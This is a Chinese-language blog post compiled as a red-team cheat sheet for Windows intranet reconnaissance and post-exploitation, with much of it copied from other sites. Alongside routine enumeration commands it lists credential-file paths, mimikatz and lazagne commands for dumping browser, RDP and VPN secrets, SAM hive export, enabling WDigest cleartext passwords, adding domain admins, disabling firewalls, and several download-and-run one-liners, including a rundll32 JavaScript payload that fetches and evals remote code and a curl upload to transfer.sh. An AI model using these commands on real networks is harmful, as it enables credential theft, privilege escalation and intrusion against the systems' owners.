---
title: windows内网信息搜集
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 60
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 攻防
  - 内网渗透
categories:
  - 攻防
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

# 

思路：

ip 、端口、系统、补丁、权限、计划任务、凭据、主机（netbois ping arp route netstat）、域（）、、、



https://www.wangan.com/p/7fygf36b9df57f04

```
1. c:/boot.ini //查看系统版本
2. c:/windows/php.ini //php配置信息
3. c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
4. c:/winnt/php.ini
5. c:/winnt/my.ini
6. c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
7. c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
8. c:\Program Files\Serv-U\ServUDaemon.ini
9. c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
10. c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
11. c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
12. c:\Program Files\RhinoSoft.com\ServUDaemon.exe
13. C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件
14. //存储了pcAnywhere的登陆密码
15. c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件
16. c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.
17. c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
18. d:\APACHE\Apache2\conf\httpd.conf
19. C:\Program Files\mysql\my.ini
20. C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
```



# 基础

```
网卡信息
ipconfig /all

系统配置信息
systeminfo  主要查看域那一行，如果是 WORKGROUP 则不存在域环境

查询当前登录用户
whoami

查询进程信息
tasklist /v  查询进程信息可以了解是否存在杀毒软件、是否存在域管进程等信息。

查询计划任务
schtasks /query /fo LIST /v

查询当前在线用户
query user || qwinsta

查询补丁信息
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

查询路由信息与 arp 缓存表
route print
arp -a
```





# 域

```
查询本机用户列表
net user

net view /domain # 查找域 
net view /domain ：域名   # 查询域内所有计算机
net group /domain  #  查询域内所有用户组列表(默认13个)
net group "domain computers" /domain   查询所有域成员计算机列表
net accounts /domain获取密码信息(密码设置要求)
nltest /domain_trusts获取域信任信息
net group "Domain Controllers" /domain查看域控制器
net group " domain admins " /domain查询域管理员用户
dsquery user查看存在的用户
查询本机用户组与管理员组成员列表
net localgroup
net localgruop administrators

查看当前登录域及登录用户信息
net config workstation

时间同步命令
net time /domain

查询主机开机时间
net statistics workstation

列出或断开本地计算机与所连接的客户端之间的会话
net session

查询本机共享列表
net share
```



# 域控

```
net group "Domain Controllers" /domain // 查看域控
net group "Domain Admins" /domain // 查看域管理员
net group "Enterprise Admins" /domain // 查看全局管理员
net time /domain // 定位当前域控
```



# IPC

```
net share // 查看共享
net use // 查看连接
```



# 网络信息

```
type C:\Windows\System32\drivers\etc\hosts // hosts 信息
ipconfig /all // ip dns 网关信息
ipconfig  /displaydns // dns 缓存
arp -a // arp 缓存
```

# 进程 端口 凭据 系统信息

```
tasklist /svc // 查看当前进程
netstat -ano // 查看开放端口
cmdkey /list // 查看本机凭据
systeminfo // 本机信息 补丁
```



# SPN

```
setspn -T test.com –q */* // 当前域的 spn 信息
setspn -q */* // 所有域的 spn 信息
```



# 计划任务

```
schtasks /Query // 计划任务
```



# 浏览器代理

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```



# 启动项

```
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run // 用户级别
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run // 系统级别
```



# 定位域管理员

域管理员定位概述

在内网中，通常会部署大量的网络安全系统和设备，例如IDS、IPS、日志审计、安全网关、反病毒软件等。在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员权限。

常用域管理员定位工具

1.psloggedon.exe.exe

3.netview.exe

4.Nmap中的NSe脚本

5.PowerVIew 脚本

6.Empire 的User_hunter模块



1）获取域管理员列表

```
net group “ Domain Admins ”/domain
```



# systeminfo

```
查询操作系统和版本信息
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"



```





# 环境变量

```
查看操作系统体系结构
echo %PROCESSOR_ARCHITECTURE%


```





# wmic

```
查看本机安装软件版本信息
wmic product get name,version

查询服务信息
wmic service list brief

查询进程信息
tasklist /v
wmic process list brief

查询启动程序信息
wmic startup get command,caption
```





# 浏览器密码 书签 历史记录 cookies

```
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* // 显示本机凭据
mimikatz "log" "privilege::debug" "dpapi::chrome /in:[FILENAME] /masterkey:[MASTERKEY]" "exit"
WebBrowserPassView.exe
lazagne.exe all
......
```



# rdp记录

```
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* // 显示本机凭据
mimikatz "log" "privilege::debug" "dpapi::cred /in:[FILENAME] /masterkey:[MASTERKEY]" "exit" // 导出 rdp 密码
```



# netstat

```
-a  所有连接
-t -u  TCP/UDP
-n  只用ip
-l  显示监听
-p  pid
-s  统计

查询端口信息
netstat -ano
```



# 防火墙

防火墙策略

```
netsh firewall show config // 2003 防火墙策略
netsh advfirewall firewall show rule name=all // 2008 2012 防火墙策略
```



```
1.查看防火墙状态
netsh firewall show config  windows server 2003及以下版本
netsh advfirewall show allprofiles state   window server 2003以上版本

2.关闭、开启防火墙（注：修改防火墙配置需要管理员权限）
Windows server 2003及之前版本：
netsh firewall set opmode disable  #关闭  
netsh firewall set opmode enable   #开启
Windows server 2003之后版本：
netsh advfirewall set allprofiles state off  #关闭    
netsh advfirewall set allprofiles state on   #开启


3.修改防火墙规则
Windows server 2003及以下版本，允许指定端口、程序连接：
netsh firewall add portopening tcp 4444 test   #指定端口    
netsh firewall add allowedprogram c:\a.exe test enable   #指定程序
Windows server 2003之后版本，允许指定端口、程序进站、出站：
netsh advfirewall firewall add rule name=test dir=in action=allow protocol=tcp localport=4444  #允许4444端口进站  
    netsh advfirewall firewall add rule name=test dir=in action=allow program=c:\a.exe  #允许a.exe进站  
    netsh advfirewall firewall add rule name=test dir=out action=allow protocol=tcp localport=4444   #允许4444端口出站    
    netsh advfirewall firewall add rule name=test dir=out action=allow program=c:\a.exe   #允许a.exe出站
    
    
    
```



# 注册表

https://www.cnblogs.com/ppsuc-21q039/p/17909881.html





# wifi密码

```
netsh wlan export profile interface=WLAN key=clear folder=C:\wlan\
```



# 回收站记录

```
$Recycler = (New-Object -ComObject Shell.Application).NameSpace(0xa);
foreach($file in $Recycler.items()){$file.path;$file.ExtendedProperty("{9B174B33-40FF-11D2-A27E-00C04FC30871} 2")+'\'+$file.name;$file.Type}
```



# VPN连接

```
mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```



# **自动信息收集**

使用 wmic 脚本自动收集进程、服务等信息。

下载地址：http://www.fuzzysecurity.com/scripts/files/wmic_info.rar



# **域内信息收集**

**获取域 SID**

```
whoami /all
```

获取域用户信息
```
net user /domain   #获取域用户
net user administrator /domain  #获取域用户administrator详细信息
wmic useraccount get /all  #获取域用户
```

**查询域**

```
net view /domain
```

**查询域内所有计算机**

```
net view /domain:liudehua
```

**查询域内用户组**

```
net group /domain
```

**查询域用户组成员列表**

```
net group "Domain Admins" /domain   #查询Domain Admins组成员
```

**查找域控机器名**

```
nltest /dclist:liudehua
```

**查找域控主机名**

```
nslookup -type=SRV _ldap._tcp
```

**查找主域控制器**

```
netdom query pdc
```

**查看域信任信息**

```
nltest /domain_trusts
```

**查看域密码信息**

```
net accounts /domain
```



# 自动安装配置文件

管理员在对内网中多台机器进行环境配置时，通常不会一台一台的配置，往往会采用脚本批量化的方式。

在这个过程中，可能就会有一些包含安装配置信息的文件，比如在这些文件中包含了账号、密码，常见的文件路径如下：

```
C:\sysprep.inf C:\syspreg\sysprep.xml C:\Windows\system32\sysprep.inf C:\windows\system32\sysprep\sysprep.xml C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattended.xml C:\Windows\Panther\Unattend\Unattended.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\System32\Sysprep\Unattend.xml C:\Windows\System32\Sysprep\Panther\Unattend.xml
来源: TeamsSix
文章作者: TeamsSix
文章链接: https://teamssix.com/210728-130839.html#!
本文章著作权归作者所有，任何形式的转载都请注明出处。
```



# 白嫖

#### [1. net命令](https://book.shentoushi.top/Info/Win_info.html#1-net命令)

```
查看用户列表: net user

powershell查看用户列表: Get-WmiObject -Class Win32_UserAccount

查看用户组列表: net localgroup

查看管理组列表: net localgroup Administrators

添加用户并设置密码: net user ASP.NET P@ssw0rd /add

将用户加入管理组: net localgroup Administrators ASP.NET /add

将用户加入桌面组: net localgroup "Remote Desktop Users" guest /add

激活guest用户: net user guest /active:yes

更改guest用户的密码: net user guest P@ssw0rd

将用户加入管理组: net localgroup administrators guest /add

将用户加入桌面组: net localgroup "Remote Desktop Users" guest /add

查看本地密码策略: net accounts

查看当前会话: net session

建立IPC会话: net use \\127.0.0.1\c$ "P@ssw0rd" /user:"domain\Administrator"
```

#### [2. 域渗透命令](https://book.shentoushi.top/Info/Win_info.html#2-域渗透命令)

```
查看当前用户权限: whoami /user

可知域名为和其他信息: net config workstation

查询域用户：net user /domain

添加域用户: net user ASP.NET Admin12345 /add /domain

添加域管理员: net group "domain admins" ASP.NET /add /domain

添加企业管理员: net group "enterprise admins" /add /domain

查询域管理员用户：net group "domain admins" /domain

查询域企业管理组: net group "enterprise admins" /domain

查询域本地管理组: net localgroup administrators /domain

查询域控制器和时间：net time /domain

查询域名称：net view /domain

查询域内计算机：net view /domain:redteam.local

查看当前域内计算机列表: net group "domain computers" /domain

查看域控机器名: net group "domain controllers" /domain

查看域密码策略: net accounts /domain

查看域信任: nltest /domain_trusts

查看某个域的域信任: nltest /domain_trusts /all_trusts /v /server:10.10.10.10

通过srv记录: nslookup -type=SRV _ldap._tcp.corp
```

#### [3. 信息收集命令](https://book.shentoushi.top/Info/Win_info.html#3-信息收集命令)

```
查看当前用户的安全特权: whoami /priv

查看当前用户: whoami /user

查看当前登陆用户: query user && quser

查看系统版本和补丁信息: systeminfo

查看系统开放端口: netstat -ano

查看系统进程: tasklist /svc

列出详细进程: tasklist /V && tasklist /V /FO CSV

查看ip地址和dns信息: ipconfig /all

查看当前用户保存的凭证: cmdkey /list

查看路由信息:route print

查看arp列表: arp -a

查看当前用户保存的票据凭证: klist
```

- 列出c盘Users文件夹:

```
dir /b c:\Users
```

- 搜索D盘磁盘名字为logo.jpg的文件:

```
cd /d D:\ && dir /b /s logo.jpg
```

- 搜素C盘文件夹下后缀conf内容有password:

```
findstr /s /i /n /d:C:\ "password" *.conf
```

- 查找Windows目录下面的Bluetooth.dll文件:

```
where /R C:\windows Bluetooth.dll
```

- 查看3389端口:

```
for /f "tokens=2" %i in ('tasklist /FI "SERVICES eq TermService" /NH') do netstat -ano | findstr %i | findstr LISTENING
```

- Windows存储的凭证:

```
rundll32 keymgr.dll,KRShowKeyMgr
```

#### [4.注册表相关](https://book.shentoushi.top/Info/Win_info.html#4注册表相关)

1. LocalAccountTokenFilterPolicy-启用任何管理员用户横向

```
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

1. 查看3389端口:

```
REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
```

1. 开启远程桌面:

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

1. 注册表抓取明文:

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

1. rdp连接默认的10个记录:

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
```

1. rdp连接默认的所有记录:

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
```

1. 查找软件安装目录:

```
reg query HKLM /f foxmail /t REG_SZ /s
```

1. reg导出注册表hash:

```
reg save hklm\sam c:\programdata\sam.hive && reg save hklm\system c:\programdata\system.hive
```

1. hash登录利用“Restricted Admin Mode“特性:

- 新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭

```
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

- 查看是否开启DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启

```
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"
```

- 然后如果hash正确就可以登录目标主机

```
mstsc.exe /restrictedadmin
```

1. CredSSP 加密数据库修正:

```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /f /v AllowEncryptionOracle /t REG_DWORD /d 2
```

1. 取消仅允许运行使用网络界别身份验证的远程桌面的计算机连接:

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
```

#### [5. 系统下载文件:](https://book.shentoushi.top/Info/Win_info.html#5-系统下载文件)

1. windows2003默认文件:

```
Blob0_0.bin //可以正常执行
```

1. certutil下载文件:

```
certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt c:\nc.txt
```

2.1 certutil删除记录:

```
certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt delete
```

1. bitsadmin下载文件:

```
bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\Pstools.zip
```

1. powershell下载文件:

```
powershell -nop -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/nc.txt','nc.exe')
```

1. msedge下载并执行:

```
cmd /c start /min msedge.exe http://127.0.0.1/test.zip && timeout 5 && taskkill /f /t /im msedge.exe && C:/Users/%UserName%/Downloads/test.zip
```

1. rundll32下载文件

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.3.150/chfs/shared/1Z3.exe",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

#### [设置网卡netsh和防火墙信息](https://book.shentoushi.top/Info/Win_info.html#设置网卡netsh和防火墙信息)

查看网卡信息

```
netsh interface show interface
```

设置主dns

```
netsh interface ip set dns "以太网" static 114.114.114.114 primary
```

设置备dns

```
netsh interface ip add dns "以太网" 8.8.8.8
```

查看防火墙状态

```
netsh advfirewall show allprofiles
```

防火墙恢复默认配置

```
netsh firewall reset
```

开启防火墙

```
netSh Advfirewall set allprofiles state on
```

关闭防火墙

```
netSh Advfirewall set allprofiles state off
```

放行3389端口

```
netsh advfirewall firewall add rule name=3389_test dir=in action=allow protocol=TCP localport=3389
```

#### [查看本机WiFi信息和配置](https://book.shentoushi.top/Info/Win_info.html#查看本机wifi信息和配置)

- 查看当前用户wifi配置文件

```
netsh wlan show profiles
```

- 查看当前连接的wifi

```
netsh wlan show interface
```

- 查看本机WiFi配置和密码:

```
netsh wlan show profile "ssid" key=clear
```

- 枚举所有连接过的wifi:

```
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```

- 连接他配置文件的其它wifi

```
netsh wlan connect name=ssid
```

- 文件上传

```
curl -k --upload-file win.exe https://transfer.sh --progress-bar
```

- sc命令

```
创建服务: sc \\127.0.0.1 create Emeripe binPath= "cmd.exe /c start c:\programdata\info.bat"
启动服务: sc \\127.0.0.1 start Emeripe
删除服务: sc \\127.0.0.1 delete Emeripe
```

- 远程桌面登录到 console 会话解决 hash 无法抓出问题

```
mstsc /admin
```

- 将用户会话连接到远程桌面会话

```
tscon ID(quser)
```

- 根据进程名字终止进程:

```
taskkill /f /t /im msedge.exe
```

- 根据进程pid终止进程:

```
taskkill /f /pid 17676
```

- tasklist查看远程主机进程:

```
tasklist /s 192.168.3.200 /u Aadministrator /p Password
tasklist /s 192.168.3.110 /u offensive\administrator /P Password /V
```

- runas启动其它用户进程:

```
runas /user:administrator /savecred "cmd.exe /k whoami"
```

- `windows开机启动路径`

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```































